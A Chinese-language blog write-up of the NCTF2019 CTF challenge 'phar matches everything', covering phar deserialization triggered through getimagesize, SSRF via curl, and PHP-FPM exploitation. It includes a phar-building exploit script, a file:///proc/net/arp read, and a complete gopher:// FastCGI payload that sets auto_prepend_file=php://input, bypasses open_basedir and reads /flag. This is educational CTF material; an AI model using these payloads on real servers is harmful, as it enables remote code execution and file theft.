---
title: '[NCTF2019]phar matches everything'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210308190505.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-04-09 20:42:42
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141314.png
---
关键词：phar反序列化；ssrf打php-fpm

WP本来不想发的，但是这道题BUU的环境有一些小变动。希望能帮到一些卡住的人。并且这道题也有很多值得学习的地方。

github把源码down下来：

    catchmine.php
    <?php
        class Easytest{
           protected $test;
            public function funny_get(){
                return $this->test;
            }
        }
        class Main {
            public $url;
            public function curl($url){
                $ch = curl_init();  
                curl_setopt($ch,CURLOPT_URL,$url);
                curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                $output=curl_exec($ch);
                curl_close($ch);
                return $output;
            }
        
    	    public function __destruct(){
                $this_is_a_easy_test=unserialize($_GET['careful']);
                if($this_is_a_easy_test->funny_get() === '1'){
                    echo $this->curl($this->url);
               }
            }    
        }
        
        if(isset($_POST["submit"])) {
            $check = getimagesize($_POST['name']);
           if($check !== false) {
                echo "File is an image - " . $check["mime"] . ".";
            } else {
                echo "File is not an image.";
            }
        }
        ?>

upload.php

    <?php
    $target_dir = "uploads/";
    $uploadOk = 1;

    $imageFileType=substr($_FILES["fileToUpload"]["name"],strrpos($_FILES["fileToUpload"]["name"],'.')+1,strlen($_FILES["fileToUpload"]["name"]));

    $file_name = md5(time());
    $file_name =substr($file_name, 0, 10).".".$imageFileType;
    
    $target_file=$target_dir.$file_name;
    
        $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
        if($check !== false) {
            echo "File is an image - " . $check["mime"] . ".";
            $uploadOk = 1;
        } else {
            echo "File is not an image.";
            $uploadOk = 0;
        }
    
    
    if (file_exists($target_file)) {
        echo "Sorry, file already exists.";
       $uploadOk = 0;
    }
    if ($_FILES["fileToUpload"]["size"] > 500000) {
        echo "Sorry, your file is too large.";
        $uploadOk = 0;
    }
    if($imageFileType !== "jpg" && $imageFileType !== "png" && $imageFileType !== "gif" && $imageFileType !== "jpeg"  ) {
        echo "Sorry, only jpg,png,gif,jpeg are allowed.";
        $uploadOk = 0;
    }
    if ($uploadOk == 0) {
        echo "Sorry, your file was not uploaded.";
    } else {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "The file $file_name  has been uploaded to ./uploads/";
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    }
    ?>

catchmine.php里面有一个反序列化，先看这里。Main::curl()明显存在SSRF并且可使用文件流造成任意文件读取。但是要触发curl的话就没法控制main里面的url了，所以还需要上传个phar文件，在getimagesize处触发。
思路：第一次反序列化，在getimagesize处触发phar反序列化，从而控制url。第二次反序列化，执行curl。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210409003728.png)

exp：（比较简单就不自己写了，来自guoke师傅

    <?php
    class Easytest{
	    protected $test='1';
    }
    class Main{
    	public $url='file:///proc/net/arp';
    }
    $a=new Easytest();
    echo urlencode(serialize($a));
    $b=new Main();
    @unlink("phar.phar");
    $phar=new Phar("phar.phar");
    $phar->startBuffering(); 
    $phar->setStub('GIF89a'."<?php __HALT_COMPILER(); ?>"); 
    $phar->setMetadata($b); 
    $phar->addFromString("test.txt", "test");
    $phar->stopBuffering();
    ?>

第一个要注意的地方，这里etc/hosts没法读到内网ip，只能用/proc/net/arp
这里我读到的是10.0.199.2 然后具体哪个会回显PHP-FPM是要自己一个个试的 我试了3、4、5 都没有 然后直接试了11是可以的。

那么php-fpm是啥呢？跟着p牛的博客学习一下：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html

精简下内容方便查看：

FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。

FPM按照fastcgi的协议将TCP流解析成真正的数据。

举个例子，用户访问http://127.0.0.1/index.php?a=1&b=2，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：

    {
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
    }

这个数组其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉fpm：“我要执行哪个PHP文件”。

PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php。

Nginx（IIS7）解析漏洞：fpm发现/var/www/html/favicon.ico/.php不存在，则去掉/.php，再判断/var/www/html/favicon.ico是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。

在fpm某个版本之前，我们可以将SCRIPT_FILENAME的值指定为任意后缀文件，比如/etc/passwd；但后来，fpm的默认配置中增加了一个选项security.limit_extensions，只能以phpx结尾。由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。

那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？

理论上当然是不可以的，即使我们能控制SCRIPT_FILENAME，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。

但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，auto_prepend_file和auto_append_file。

auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。

那么就有趣了，假设我们设置auto_prepend_file为php://input，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项allow_url_include）

那么，我们怎么设置auto_prepend_file的值？

这又涉及到PHP-FPM的两个环境变量，PHP_VALUE和PHP_ADMIN_VALUE。这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）

所以，我们最后传入如下环境变量：
   
    {
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
    'PHP_VALUE': 'auto_prepend_file = php://input',
    'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }

exp：https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75

最后构造gopher协议即可
payload：

    gopher://10.0.199.11:9000/_%01%01%F6%FD%00%08%00%00%00%01%00%00%00%00%00%00%01%04%F6%FD%01%DC%00%00%0E%03CONTENT_LENGTH203%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%F6%FD%00%00%00%00%01%05%F6%FD%00%CB%00%00%3C%3Fphp%20mkdir%28%27/tmp/fuck%27%29%3Bchdir%28%27/tmp/fuck%27%29%3Bini_set%28%27open_basedir%27%2C%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Bprint_r%28scandir%28%27/%27%29%29%3Breadfile%28%27/flag%27%29%3B%3F%3E%01%05%F6%FD%00%00%00%00

里面还有一个知识点，open_basedir的绕过和disable_function的限制。
四个执行函数都被ban了，用readfile代替即可。
open_basedir绕过的姿势网上有很多，这里我用的是通过chdir()和ini_set()来进行跨路径访问，网上找姿势的时候记得这里题目是php7，有些老版本的是不行的。
参考链接：https://xz.aliyun.com/t/4720

好耶 学到许多